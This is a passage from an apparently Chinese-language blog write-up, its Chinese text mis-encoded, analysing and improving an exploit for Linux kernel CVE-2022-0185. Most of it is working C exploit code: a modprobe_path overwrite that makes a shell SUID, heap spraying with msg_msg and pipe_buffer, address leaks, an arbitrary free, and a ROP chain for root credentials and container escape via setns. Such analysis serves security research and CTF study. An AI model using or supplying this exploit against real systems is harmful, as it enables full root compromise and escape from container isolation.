  char w[] = "#!/bin/sh\nchmod u+s " SHELL "\n";
  chmod(modprobe_trigger, 0777);
  fd = open(modprobe_win, O_RDWR | O_CREAT);
  if (fd < 0) {
    perror("winner creation failed");
    exit(-1);
  }
  write(fd, w, sizeof(w));
  close(fd);
  chmod(modprobe_win, 0777);
  return;
}
```

**è§¦å‘ `modprobe_path`**ï¼šæ‰§è¡Œä¸€ä¸ªå«æœªçŸ¥å­—èŠ‚çš„binaryï¼Œå†…æ ¸å°±ä¼šåˆ©ç”¨modprobeå»å¯»æ‰¾ä¸€ä¸ªmoduleæ¥åŠ è½½è¯¥binaryã€‚

```c
// å†…æ ¸æºç 
do_execve return do_execveat_common(fd, filename, argv, envp, flags);
do_execveat_common retval = bprm_execve(bprm, fd, filename, flags);
bprm_execve retval = exec_binprm(bprm);
exec_binrpm ret = search_binary_handler(bprm);
search_binary_handler if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
request_module ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
call_modprobe
static int call_modprobe(char *module_name, int wait) {
	struct subprocess_info *info;
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
		NULL
	};
	char **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
	module_name = kstrdup(module_name, GFP_KERNEL);
	argv[0] = modprobe_path; // <--- overwritten!
	argv[1] = "-q";
	argv[2] = "--";
	argv[3] = module_name;
	argv[4] = NULL;

	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL, NULL, free_modprobe_argv, NULL);
	return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
}

// exp ä¸­ä»£ç 
char *modprobe_trigger = "/tmp/root";
void modprobe_init() {
  int fd = open(modprobe_trigger, O_RDWR | O_CREAT);
  char root[] = "\xff\xff\xff\xff";
  write(fd, root, sizeof(root));
  close(fd);
  chmod(modprobe_trigger, 0777);
  [ ... ]
}
void modprobe_hax() {
  puts("[*] Attempting to trigger modprobe");
  execve(modprobe_trigger, NULL, NULL);
}
To finish up, we repeatedly attempt to trigger the overwrite and trigger modprobe_path. We can verify if it has succeeded by checking the permissions on /bin/bash:
while (1) {
  do_win();
  modprobe_hax();
  struct stat check;
  // Get permissions on file
  stat(SHELL, &check);
  if (check.st_mode & S_ISUID) {
    break;
  }
}
puts("[*] Exploit success! " SHELL " is SUID now!");
puts("[+] Popping shell");
execve(SHELL, root_argv, NULL);
```

**é—®é¢˜**ï¼šåŸä½œè€…çš„æµ‹è¯•ç¯å¢ƒæ˜¯Ubuntu-20.04ï¼Œä½†åœ¨æˆ‘ç¼–è¯‘çš„ç¯å¢ƒä¸­ï¼ˆç‰ˆæœ¬v5.16.1ï¼‰ï¼Œå †å–·éå¸¸ä¸ç¨³å®šï¼Œéœ€è¦æ”¹å–„å †å–·ç­–ç•¥ã€‚æˆ‘æ²¿ç”¨äº† CVE-2021-42008çš„ç­–ç•¥è¿˜æ˜¯ä¸è¡Œï¼Œä¸èƒ½ç¡®ä¿æ¼æ´å¯¹è±¡çš„åé¢è·Ÿç€ä¸€ä¸ª kmalloc-4096 çš„ `msg_msg` ï¼Œå‘ç° `msg_msg` å’Œæ¼æ´å¯¹è±¡æ€»æ˜¯ä½äºä¸åŒçš„cacheï¼Œå¾ˆå¥‡æ€ªã€‚å¸Œæœ›æœ‰å¤§ä½¬èƒ½å¼„æ¸…ä¸ºä»€ä¹ˆï¼Œç„å­¦ï¼

æ¢äº†ä¸ªç‰ˆæœ¬ v5.11.22ï¼Œå¶ç„¶æˆåŠŸäº†ä¸€æ¬¡ï¼ˆæˆåŠŸèµ‹äºˆäº†busybox  sæƒé™ï¼‰ï¼Œè°ƒè¯•åå‘ç° `msg_msg` å’Œæ¼æ´å¯¹è±¡å¯ä»¥ä½äºåŒä¸€cacheï¼š

![1-succeed-5-11-22](/images/posts/CVE-2022-0185/1-succeed-5-11-22.png)

#### 3-5 æ”¹è¿›exploit

**æ”¹è¿›ææƒæ–¹å¼**ï¼šåŸå…ˆåªæ˜¯ç»™ `/bin/su` åŠ äº†ä¸ªsuidï¼Œç°åœ¨ç›´æ¥ææƒã€‚

**æ”¹è¿›å †å–·ç­–ç•¥**ï¼šåŸå…ˆåœ¨ç¯¡æ”¹ `msg_msg->next` æ—¶ï¼Œæ¯æ¬¡å°è¯•ï¼Œéƒ½å…ˆç”³è¯·1ä¸ªæ¼æ´å¯¹è±¡ï¼Œç„¶åå†ç”³è¯·1ä¸ª` msg_msg` å¯¹è±¡ï¼Œå¾ˆéš¾ç¢°æ’åˆ° `msg_msg` æ°å¥½åœ¨æ¼æ´å¯¹è±¡åé¢çš„æƒ…å†µã€‚ç°åœ¨æˆ‘ä¸€æ¬¡ç”³è¯·10ä¸ªæ¼æ´å¯¹è±¡ï¼Œç„¶åå†ç”³è¯·1ä¸ª `msg_msg` å¯¹è±¡ï¼Œ10æ¬¡æº¢å‡ºæ€»æœ‰ä¸€æ¬¡èƒ½æˆåŠŸç¯¡æ”¹  `msg_msg->next` å§ã€‚æœç„¶ï¼Œåªè¦å‡ æ¬¡å°è¯•å°±èƒ½æˆåŠŸç¯¡æ”¹ `modprobe_path`ï¼š

```c
    for (int i = 0; i < 0xa; i++)
    {
        fdv[i] = fsopen("ext4", 0);
        if (fdv[i] < 0) 
        {
            puts("Opening");
            exit(-1);
        }
        for (int j = 0; j < 117; j++) 
            fsconfig(fdv[i], FSCONFIG_SET_STRING, "\x00", pat, 0);
    }
```

![1-2-succeed](/images/posts/CVE-2022-0185/1-2-succeed.png)



---

## 4. æ¼æ´åˆ©ç”¨æ–¹æ³•2â€”KCTF ææƒ

è¯´æ˜ä¸€ä¸‹ï¼Œä½œè€…ç”¨åœ¨KCTFç¯å¢ƒä¸Šçš„ææƒæ–¹æ³•ï¼Œåœ¨æ™®é€šç³»ç»Ÿä¸Šä¹Ÿèƒ½ä½¿ç”¨ï¼Œæˆ‘è§‰å¾—è¿™ç§æ–¹æ³•æ›´å¥½ä¸€ç‚¹ï¼Œå› ä¸ºæœ‰äº›ç³»ç»Ÿä¸Šä¸ä¸€å®šæœ‰userfaultå’Œfuseæƒé™ã€‚

**KCTFè¦æ±‚**ï¼šæœ‰ä¸¤ç§è¦æ±‚ï¼Œä¸€æ˜¯kctfï¼Œåœ¨å®¹å™¨ä¸Šææƒå¹¶è¯»å–flagï¼ŒäºŒæ˜¯fullchainï¼Œåœ¨å®¹å™¨ä¸Šææƒï¼Œé€ƒé€¸åˆ°hostï¼Œå†è¯»å–å¦ä¸€ä¸ªå®¹å™¨çš„flagã€‚

**KCTFéš¾ç‚¹**ï¼š 

- /dev ç›®å½•ä¸œè¥¿å¾ˆå°‘ï¼ŒFUSEå’Œä¸€äº›ç»“æ„å¦‚ `tty_struct` ä¸èƒ½ä½¿ç”¨ï¼Œuserfault ä¹Ÿè¢«ç¦ç”¨ï¼Œæœ‰å¾ˆå¤š4kçš„å¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦è°ƒæ•´å †å–·ç­–ç•¥ã€‚
- å¦ä¸€ä¸ªé—®é¢˜æ˜¯ `GFP_KERNEL_ACCOUNT` flagï¼Œè¿™ä¸ªflagç”¨äºæ ‡è®°dataæ¥è‡ªç”¨æˆ·å±‚çš„å¯¹è±¡ï¼Œä¾‹å¦‚ `msg_msg`ï¼Œ5.9ä»¥å‰ï¼Œå†…æ ¸ä¼šæŠŠè¿™ç±»å¯¹è±¡æ”¾åœ¨å•ç‹¬çš„slabï¼ˆå‰ææ˜¯è®¾ç½® `CONFIG_MEMCG_KMEM` ç¼–è¯‘é€‰é¡¹ï¼‰ã€‚å…¶å®æœ¬æ–‡æ¶‰åŠåˆ°çš„legacyæ¼æ´å¯¹è±¡ä¹Ÿåº”è¯¥ç”¨ `accounting ` flag è¿›è¡Œæ ‡è¯†ï¼Œå¯èƒ½æ˜¯å¼€å‘è€…æå¿˜äº†ï¼Œç›´åˆ° [commit for 5.16](https://github.com/torvalds/linux/commit/bb902cb47cf93b33cd92b3b7a4019330a03ef57f#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05) æ‰åŠ ä¸Šï¼Œè¿™æ„å‘³ç€åœ¨kctfè¿™ä¸ª 5.4 çš„è€ç‰ˆæœ¬ä¸Šä¸èƒ½ä½¿ç”¨ `msg_msg` å¯¹è±¡äº†ï¼Œå¹¸è¿çš„æ˜¯kctfæœ€è¿‘å°†å†…æ ¸æ›´æ–°åˆ°äº† 5.10ï¼Œç°åœ¨ `msg_msg` å¯¹è±¡å¯ç”¨äº†ã€‚ï¼ˆPSï¼šStarlabs å›¢é˜Ÿçš„ n0psledbyte æ›¾åœ¨è€ç‰ˆæœ¬çš„kctfç¯å¢ƒä¸Šç”¨ `msg_msg` æ¥å®ç° cross cache overflowï¼Œè¯¥ç­–ç•¥å¯ä»¥å‚è€ƒ grsecurity çš„è¿™ç¯‡æ–‡ç«  â€”â€” [article](https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game)ï¼‰

**åˆ©ç”¨æ–¹æ³•é€‰æ‹©**ï¼šç”±äºç¯å¢ƒé™åˆ¶ï¼Œä¸èƒ½ç”¨ `msg_msg` å®ç°ä»»æ„å†™äº†ï¼Œç°åœ¨å¯ä»¥é‡‡ç”¨ `msg_msg` æä¾›çš„ [unlink åŸè¯­](https://kagehutatsu.com/?p=577) æˆ–è€… ä»»æ„é‡Šæ”¾åŸè¯­ã€‚æœ€åæ‰“ç®—ç¯¡æ”¹ `pipe_buffer` çš„å‡½æ•°è¡¨æŒ‡é’ˆæŒ‡å‘æŸä¸ª `msg_msg` chunk ï¼ˆå‚è€ƒ CVE-2021-22555 çš„æ–¹æ³•ï¼‰ã€‚

**å°trick**ï¼š[salt](https://github.com/PaoloMonti42/salt/blob/master/docs/0x00_SLUB_refresher.md) å·¥å…·ä¾¿äºè°ƒè¯•å†…æ ¸å †ã€‚é¦–å…ˆï¼Œè°ƒç”¨`set_affility()` ç»‘å®šåˆ°ä¸€ä¸ªCPUæ ¸ä¸Šè¿è¡Œï¼ˆå› ä¸ºæ¯ä¸ªCPUéƒ½æœ‰è‡ªå·±çš„freelistï¼‰ï¼Œä»¥ä¸‹ç­–ç•¥æ˜¯é’ˆå¯¹kCTFç¯å¢ƒçš„ï¼š

- æå‰å †å–·å¾ˆå¤š` msg_msg` ï¼Œé€‚æ—¶çš„é‡Šæ”¾éƒ¨åˆ† `msg_msg` æ¥åˆ©ç”¨ï¼›
- ä» `fsconfig` æº¢å‡º `msg_msg` ä¹‹å‰ï¼Œå…ˆåˆ†é…4åˆ°7ä¸ª `msg_msg`ï¼ˆå› ä¸º kmalloc-4k slabä¸­åªæœ‰8ä¸ªå¯¹è±¡ï¼‰ï¼Œå†å¯¹å…¶ä¸­ä¸€ä¸ª `msg_msg` è§¦å‘ `MSG_COPY`ï¼Œä¼šåœ¨copyæ—¶å¯¹åŒä¸€slabè¿›è¡Œåˆ†é…å’Œé‡Šæ”¾ï¼Œè¿™æ ·å°±ä¼šåœ¨slabä¸­äº§ç”Ÿä¸€ä¸ªholeï¼Œä¸‹ä¸€æ¬¡åˆ†é…legacyå¯¹è±¡æ—¶å°±ä¼šå æ®è¿™ä¸ªholeã€‚

#### 4-1 æ³„éœ²å †åœ°å€

**å †åœ°å€æ³„éœ²**ï¼š `msg_queue` ä¼šæŠŠ `msg_msg` ä»¥åŒé“¾è¡¨ä¸²èµ·æ¥ï¼Œå¯ä»¥åˆ†é…ä¸¤ä¸ªqueueï¼Œqueue1ä¸­ ` kmalloc-4k <-> kmalloc-64`ï¼Œqueue2ä¸­ `kmalloc-1k <-> kmalloc-64 <-> kmalloc-512` ï¼Œåˆ©ç”¨ OOB read æ¥æ³„éœ² kmalloc-512 å’Œ kmalloc-1k å¯¹è±¡çš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯ kmalloc-64 çš„ `msg_msg->m_list.next / prev`ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

![diagram1](/images/posts/CVE-2022-0185/diagram1.png)

åˆ©ç”¨å †æº¢å‡ºç¯¡æ”¹ queue1 ä¸­ kmalloc-4k çš„ `msg_msg->m_ts` å¹¶é‡‡ç”¨ `MSG_COPY` è¿›è¡Œ OOB read

![diagram2](/images/posts/CVE-2022-0185/diagram2.png)

å¯ä»¥æ ¹æ® `msg_msg` åŒ…å«çš„å†…å®¹æ¥åˆ¤æ–­æ³„éœ²çš„åœ°å€å±äºå“ªä¸€ä¸ª `msg_queue`ï¼Œè¿™æ ·å°±èƒ½é€‰æ‹©æ€§çš„é‡Šæ”¾å¹¶å–·å°„ `pipe_buffer` å¯¹è±¡å æ® kmalloc-1kï¼Œåœ¨ kmalloc-512 ä¸Šå¸ƒç½® stack pivot gadgetã€‚

![diagram3](/images/posts/CVE-2022-0185/diagram3.png)

ä»¥ä¸‹ä»£ç å¯ä»¥æ³„éœ²å †åœ°å€ï¼š

```c
double_heap_leaks do_heap_leaks()
{
    uint64_t kmalloc_1024 = 0;
    uint64_t kmalloc_512 = 0;
    char pivot_spray[0x2000] = {0};
    uint64_t *pivot_spray_ptr = (uint64_t *)pivot_spray;
    double_heap_leaks leaks = {0};
    int linked_msg[256] = {0};
    char pat[0x1000] = {0};
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;

    // spray kmalloc-512 linked to kmalloc-64 linked to kmalloc-1k in unique msg queues
    for (int i = 0; i < 255; i++) 
    {
        linked_msg[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        memset(pivot_spray, 0x0, sizeof(pivot_spray));
        pivot_spray_ptr[0] = 1;
        for (int i = 0; i < 10;i ++)
        {
            pivot_spray_ptr[i+1] = stack_pivot;
        }

        // spray pivots using kmalloc-512 allocations
        send_msg(linked_msg[i], pivot_spray, 0x200 - 0x30, 0);
        memset(buffer, 0x1+i, sizeof(buffer));
        message->mtype = 2;
        send_msg(linked_msg[i], message, 0x40 - 0x30, 0);
        message->mtype = 3;
        send_msg(linked_msg[i], message, 0x400 - 0x30 - 0x40, 0);
    }

    int size = 0x1038;
    int targets[H_SPRAY] = {0};

    for (int i = 0; i < H_SPRAY; i++) 
    {
        memset(buffer, 0x41+i, sizeof(buffer));
        targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(targets[i], message, size - 0x30, 0);
    }

    // create hole hopefully
    get_msg(targets[0], recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    puts("[*] Opening ext4 filesystem");
    fd = fsopen("ext4", 0);
    if (fd < 0) 
    {
        puts("fsopen: Remember to unshare");
        exit(-1);
    }

    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    }

    // fill it a bit to help prevent potential crashes on MSG_COPY
    stuff_4k(16);

    puts("[*] Overflowing...");
    pat[21] = '\x00';
    char evil[] = "\x60\x19";
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);
    puts("[*] Done heap overflow");

    size = 0x1960;
    puts("[*] Receiving corrupted size and leak data");
    // go through all targets qids and check if we hopefully get a leak
    for (int i = 0; i < H_SPRAY; i++) 
    {
        get_msg(targets[i], recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        for (int j = 0x202; j < 0x202 + (0x1960-0x1010) / 8; j++)
        {
            uint64_t *dump = (uint64_t *)recieved;
            if (dump[j] == 0x2 && dump[j+1] == 0x10 && dump[j+4] == dump[j+5])
            {
                kmalloc_1024 = dump[j-2];
                kmalloc_512 = dump[j-1];

                // delete chunk 1024, chunk 512 already has sprayed pivots
                uint8_t target_idx = (dump[j+4] & 0xff) - 1;

                get_msg(linked_msg[target_idx], recieved, 0x400 - 0x30, 3, IPC_NOWAIT | MSG_NOERROR);

                // spray to replace with pipe_buffer, thanks LIFO!
                for (int k = 0; k < PIPES; k++)
                {
                    if (pipe(pipefd[k]) < 0)
                    {
                        perror("pipe failed");
                        exit(-1);
                    }
                    write(pipefd[k][1], "pwnage", 7);
                }
                break;
            }
        }
        if (kmalloc_1024 != 0)
        {
            break;
        }
    }
    close(fd);

    if (!kmalloc_1024)
    {
        puts("[X] No leaks, trying again");
        stuff_4k(16);
        return leaks;
    }
    leaks.kmalloc_1024_leak = kmalloc_1024;
    leaks.kmalloc_512_leak = kmalloc_512;
    return leaks;
}
```

æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œå°±èƒ½æ§åˆ¶ `pipe_buffer->ops`ã€‚

#### 4-2 ç¯¡æ”¹ `pipe_buffer->ops` 

**æ–¹æ³•ä¸€unlink**ï¼šä½œè€…é¦–å…ˆå°è¯•äº†unlink attackï¼Œåœ¨ `do_msgrcv()` ä¸­ï¼Œä¸æŒ‡å®š `MSG_COPY` å°±ä¼šæ‰§è¡Œ [unlink operation](https://elixir.bootlin.com/linux/v5.16.1/source/ipc/msg.c#L1157) ï¼Œç›´è§‚æ¥è¯´å°±æ˜¯æ‰§è¡Œ `victim->prev->next = victim->next` å’Œ `victim->next->prev = victim->prev`ï¼Œå¦‚æœè®¾ç½®  `victim->prev` æŒ‡å‘ `pipe_buffer->ops` çš„ä½ç½®ï¼Œè®¾ç½®`victim->next` æŒ‡å‘ kmalloc-512 å†…éƒ¨ï¼ˆå¯æ§ï¼‰ï¼Œè¿™æ ·å°±èƒ½å°†  `pipe_buffer->ops`  ç¯¡æ”¹æŒ‡å‘ä¼ªé€ çš„å‡½æ•°è¡¨ï¼Œunlinkæµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š

![diagram4](/images/posts/CVE-2022-0185/diagram4.png)

**é—®é¢˜-unlink check**ï¼šå†…æ ¸å¼€å¯äº† `CONFIG_DEBUG_LIST` ï¼Œä¼šè°ƒç”¨ [__list_del_entry_valid()](https://elixir.bootlin.com/linux/v5.7/source/lib/list_debug.c#L38) å¯¹unlinkè¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥ä¸é€šè¿‡åˆ™ä¸ä¼šè¿›è¡Œunlinkï¼ˆä½†è¿˜æ˜¯ä¼šè¿›è¡Œé‡Šæ”¾ï¼ŒåŸæ¥çš„æŒ‡é’ˆä¼šè¢«è®¾ç½®ä¸º `POISON` å€¼ï¼‰

```c
bool __list_del_entry_valid(struct list_head *entry)
{
        struct list_head *prev, *next;

        prev = entry->prev;
        next = entry->next;

        if (CHECK_DATA_CORRUPTION(next == LIST_POISON1,
                        "list_del corruption, %px->next is LIST_POISON1 (%px)\n",
                        entry, LIST_POISON1) ||
            CHECK_DATA_CORRUPTION(prev == LIST_POISON2,
                        "list_del corruption, %px->prev is LIST_POISON2 (%px)\n",
                        entry, LIST_POISON2) ||
            CHECK_DATA_CORRUPTION(prev->next != entry,
                        "list_del corruption. prev->next should be %px, but was %px\n",
                        entry, prev->next) ||
            CHECK_DATA_CORRUPTION(next->prev != entry,
                        "list_del corruption. next->prev should be %px, but was %px\n",
                        entry, next->prev))
                return false;

        return true;
}
```

**æ–¹æ³•äºŒä»»æ„é‡Šæ”¾**ï¼šä½†æˆ‘ä»¬å·²ç»æ³„éœ²äº†å †åœ°å€ï¼Œå³ä½¿unlinkå¤±è´¥äº†ä¹Ÿå¯ä»¥å°†é“¾è¡¨æŒ‡é’ˆæ”¹ä¸ºæœ‰æ•ˆçš„å€¼ï¼Œç»§ç»­è¦†å†™ `msg_msg->next` æŒ‡é’ˆå’Œ `msg_msg->security` æŒ‡é’ˆæ¥æ„é€ ä»»æ„é‡Šæ”¾ã€‚ç”±äºpayloadå¿…é¡»ä¸ºæœ‰æ•ˆçš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æ³„éœ²çš„å †åœ°å€è¿›è¡Œéå¯¹é½é‡Šæ”¾ï¼ˆ `msg_msg->next = &kmalloc-1k - 0x20` / `msg_msg->security = &kmalloc-512 - 0x20` ï¼Œå…³é”®æ˜¯é‡Šæ”¾å‰è€…ï¼Œåè€…ä¸é‡è¦ï¼‰ï¼Œé‡Šæ”¾ `&kmalloc-1k - 0x20` ä¹‹åï¼Œå†åˆ†é…ä¸€ä¸ª kmalloc-1k å¤§å°çš„ `msg_msg` æ¥ç¯¡æ”¹ `pipe_buffer->ops` æŒ‡å‘å­˜æ”¾ stack pivot gadget çš„åœ°æ–¹ï¼ŒåŒæ—¶é¿å…è§¦å‘ `hardened usercopy bound checks`ã€‚

4k `msg_msg` çš„ä¼ªé€ æµç¨‹å¦‚ä¸‹ï¼š

![diagram5](/images/posts/CVE-2022-0185/diagram5.png)

æ¥ç€ï¼Œé‡Šæ”¾ 4k `msg_msg` å¹¶å †å–·1k `msg_msg` ä»¥ç¯¡æ”¹è¢«é‡Šæ”¾çš„ `pipe_buffer` ï¼š

![diagram6](/images/posts/CVE-2022-0185/diagram6.png)

#### 4-3 ROP æ„é€ å¹¶ææƒ

**ROPä½ç½®**ï¼šå…³é—­ `pipefd` å°±èƒ½è§¦å‘æ‰§è¡Œ stack pivotï¼Œä½†æ­¤æ—¶å‘ç°æ²¡æœ‰å¯„å­˜å™¨æŒ‡å‘ kmalloc-512 å†…éƒ¨ï¼ŒRAXæŒ‡å‘ `pipe_buffer` å¼€å¤´ï¼ˆkmalloc-1kï¼‰ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¦åœ¨ `pipe_buffer` ä¸Šå¸ƒç½® ROP chainï¼Œæˆ‘ä»¬çš„ stack pivot éœ€è¦å°†rspæ”¹æˆraxã€‚

**å¯ç”¨çš„ gadget**ï¼š

- `mov rsp, rax ; pop rbp ; ret;` â€”â€” stack pivot
-  `pop rdi ; ret ;`
-  `pop rsi ; ret ;`
- `test esi, esi ; cmovne rdi, rax ; mov rax, qword [rdi] ; pop rbp ; ret ;` â€”â€” rdi = rax

**ROPæ„é€ **ï¼šROPé“¾çš„ç›®æ ‡æ˜¯æ‹¥æœ‰root namespace ä¸­çš„rootæƒé™ï¼Œå¯ç›´æ¥åˆ©ç”¨ CVE-2021-22555 ä¸­çš„ROP chainæ¥æ‰§è¡Œ  `commit_cred(prepare_kernel_cred(NULL))` å’Œ `switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)` ï¼Œæœ€åè°ƒç”¨ `swapgs_and_return_to_userspace` è¿”å›ç”¨æˆ·ç©ºé—´ï¼Œæœ€åæ‰§è¡Œå¸¸è§„çš„å®¹å™¨é€ƒé€¸æ­¥éª¤ï¼ˆ [`setns` tricks](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) ï¼‰ã€‚

ä»¥ä¸‹ä»£ç èƒ½å¤Ÿææƒå’Œå®¹å™¨é€ƒé€¸ï¼š

```c
void dump_flag()
{
    char buf[200] = {0};
    for (int i = 0; i < 4194304; i++) 
    {
        // bruteforce root namespace pid equivalent of the other container's sleep process
        snprintf(buf, sizeof(buf), "/proc/%d/root/flag/flag", i);
        int fd = open(buf, O_RDONLY);
        if (fd < 0) 
        {
            continue;
        }
        puts("ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²");
        read(fd, buf, 100);
        write(1, buf, 100);
        puts("ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²ğŸ²");
        close(fd);
    }
    return;
}

__attribute__((naked)) win()
{
    // thanks movaps sooooooo much
    asm volatile(
        "mov rbp, rsp;"
        "and rsp, -0xf;"
        "call dump_flag;"
        "mov rsp, rbp;"
        "ret;");
}

void pwned()
{
    write(1, "ROOOOOOOOOOOT\n", 14);
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);
    win();
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    _exit(0);
}

void do_win(uint64_t kmalloc_512, uint64_t kmalloc_1024) 
{
    int size = 0x1000;
    int target = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    char pat[0x40] = {0};
    msg* message = (msg*)buffer;
    memset(buffer, 0x44, sizeof(buffer));
    int ready = 0;
    int ignition_target = -1;

    // doesn't matter as long as valid pointers
    uint64_t next_target = kmalloc_1024 + 0x440;
    uint64_t prev_target = kmalloc_512 + 0x440;

    // set up arb free primitive, avoid tripping hardened usercopy when re-alloc with msg_msg
    uint64_t free_target = kmalloc_1024 - 0x20;
    uint64_t make_sec_happy = kmalloc_512 - 0x20;

    stuff_4k(16);

    int targets[P_SPRAY] = {0};

    while (!ready)
    {
        for (int i = 0; i < P_SPRAY; i++) 
        {
            memset(buffer, 0x41+i, sizeof(buffer));
            targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
            send_msg(targets[i], message, size - 0x30, 0);
        }

        get_msg(targets[0], recieved, size-0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);

        // misaligned arb free attack
        fd = fsopen("ext4", 0);
        if (fd < 0) 
        {
                puts("Opening");
                exit(-1);
        }

        strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        for (int i = 0; i < 117; i++) {
            fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
        }
        puts("[*] Done heap overflow");

        char evil[0x40] = {0};
        uint64_t *evil_ptr = (uint64_t *)evil;
        memset(evil, 0x41, 0x30);
        evil_ptr[0] = next_target;
        evil_ptr[1] = prev_target;
        evil_ptr[4] = free_target;
        evil_ptr[5] = make_sec_happy;

         // in case null bytes in addresses
        if(strlen(evil) != 0x30)
        {
            puts("unable to continue given heap addresses");
            exit(-1);
        }

        puts("[*] Overflowing...");
        fsconfig(fd, FSCONFIG_SET_STRING, evil, "\x00", 0);
        puts("check heap to check preparedness for ignition");

        stuff_4k(16);

        for (int i = 0; i < P_SPRAY; i++)
        {
            memset(recieved, 0, sizeof(recieved));
            // rely on error code to determine if we have found our target which we overflowed into
            int ret = get_msg_no_err(targets[i], recieved, size+0x50-0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
            if (ret < 0)
            {
                ready = 1;
                ignition_target = i;
                break;
            }
        }

        if (!ready)
        {
            puts("nothing ready for ignition, trying again");
            // re-stuff freelist and stabilize
            stuff_4k(16);
        }
    }

    char overwrite[0x300] = {0};
    memset(overwrite, 0x41, sizeof(overwrite));
    uint64_t *overwrite_ptr = (uint64_t *)overwrite;

    // redirect to "table" of stack pivots
    overwrite_ptr[1] = kmalloc_512 + 0x50;

    uint64_t user_rflags, user_cs, user_ss, user_sp;
    asm volatile(
        "mov %0, %%cs\n"
        "mov %1, %%ss\n"
        "mov %2, %%rsp\n"
        "pushfq\n"
        "pop %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
    );

    uint64_t chain[] = 
    {
        pop_rdi,
        0,
        prepare_kernel_cred,
        pop_rsi,
        0xbaadbabe,
        cmov_rdi_rax_esi_nz_pop_rbp,
        0xdeadbeef,
        commit_creds,
        pop_rdi,
        1,
        find_task_by_vpid,
        pop_rsi,
        0xbaadbabe,
        cmov_rdi_rax_esi_nz_pop_rbp,
        0xdeadbeef,
        pop_rsi,
        init_nsproxy,
        switch_task_namespaces,
        kpti_trampoline,
        0xdeadbeef,
        0xbaadf00d,
        (uint64_t)pwned,
        user_cs,
        user_rflags,
        user_sp & 0xffffffffffffff00,
        user_ss,
    };

    memcpy(&overwrite_ptr[2], chain, sizeof(chain));

    for (int i = 0; i < P_SPRAY; i++)
    {
        get_msg(targets[i], recieved, size-0x30, 0, IPC_NOWAIT | MSG_NOERROR);
    }

    // spray rop chain plus evil vtable ptr to overlap with pipe_buffer
    for (int i = 0; i < ROP_SPRAY; i++)
    {
        send_msg(rop_msg_qid[i], overwrite, 0x300 - 0x30, 0);
    }

    deplete_512();
    deplete_4k();
    puts("[*] Attempt at igniting ROP!");

    // trigger
    for (int i = 0; i < PIPES; i++)
    {
        close(pipefd[i][0]);
        close(pipefd[i][1]);
    }

}
```

**è¯»å–flag**ï¼šä¸ºäº†æ‰¾åˆ°å…¶ä»–å®¹å™¨çš„flagï¼Œä½œè€…ç›´æ¥å°è¯•è·å– `/proc/pid/root/flag/flag` ï¼ˆæš´æœpidï¼‰ã€‚

**ç¼ºç‚¹**ï¼šéœ€è¦ä¸‰æ¬¡è§¦å‘æ¼æ´ï¼Œå †å–·ä¸ä¸€å®šç¨³å®šã€‚

#### 4-4 æ”¹è¿›exploit

**åŠ«æŒRIPæ—¶çš„ä¸Šä¸‹æ–‡**ï¼šåœ¨è°ƒç”¨æ‰§è¡Œ `pipe_buffer->ops->release()` æ—¶ï¼Œæˆ‘ä»¬çš„ç¯å¢ƒä¸­æ˜¯ RSI æŒ‡å‘ `pipe_buffer`ã€‚æ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€ä¸‹ROPé“¾ã€‚ä¸»è¦å‚è€ƒ CVE-2021-22555 ä¸­ç”¨åˆ°çš„ä¸€ä¸ª stack pivot gadget â€”â€” `push rsi; jmp qword ptr [rsi + 0x39]`ï¼Œè¿™æ ·å¯ä»¥åœ¨ `pipe_buffer+0x39` å¤„æ”¾ç½®ä¸€ä¸ª `pop rsp` æ¥åŠ«æŒæ ˆã€‚

**å®Œæ•´ROPé“¾**ï¼š

```c
void build_krop(char *buf) {
